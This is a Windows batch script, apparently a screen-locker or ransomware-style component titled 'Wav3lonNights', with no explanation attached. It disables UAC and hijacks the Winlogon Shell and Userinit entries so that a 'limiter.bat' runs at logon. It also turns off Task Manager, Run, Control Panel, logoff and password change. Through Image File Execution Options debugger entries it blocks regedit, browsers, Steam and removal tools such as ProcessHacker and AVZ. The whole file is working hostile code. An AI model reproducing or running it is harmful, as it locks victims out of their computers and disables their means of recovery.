@noclose -disable SC_CLOSE
@echo off
start start.vbs
ping 127.0.0.1 -n 2 >nul
cd %~dp0
set title=Wav3lonNights
title %title%
echo @echo off >C:\Windows\Temp\block.bat
echo title %title% >>C:\Windows\Temp\block.bat
echo echo %title% >>C:\Windows\Temp\block.bat
echo ping 127.0.0.1 -n 2 ^>nul >>C:\Windows\Temp\block.bat
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v "Shell" /t REG_SZ /d "explorer.exe, %~dp0limiter.bat"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe, %~dp0limiter.bat"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /f /v "NoRun" /t REG_DWORD /d 1
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /f /v "DisableTaskMgr" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /f /v "DisableLockWorkstation" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /f /v "DisableChangePassword" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /f /v "NoLogoff" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /f /v "HideFastUserSwitching" /t REG_DWORD /d 1
reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC /v "RestrictToPermittedSnapins" /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v "NoControlPanel" /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power /v "HibernateEnabled" /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v "ShutdownWithoutLogon" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HidePowerOptions /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v IgnoreShiftOverride /t REG_SZ /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettings.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdge.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeCP.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\palemoon.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc1.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DS4Windows.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wallpaper32.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wallpaper64.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gew48rre.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avz.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\steam.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\steamwebhelper.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SU.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UN.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\1.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\111.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\11.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\123.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\12.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\1234.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\12345.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\123456.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\block.bat" /f
exit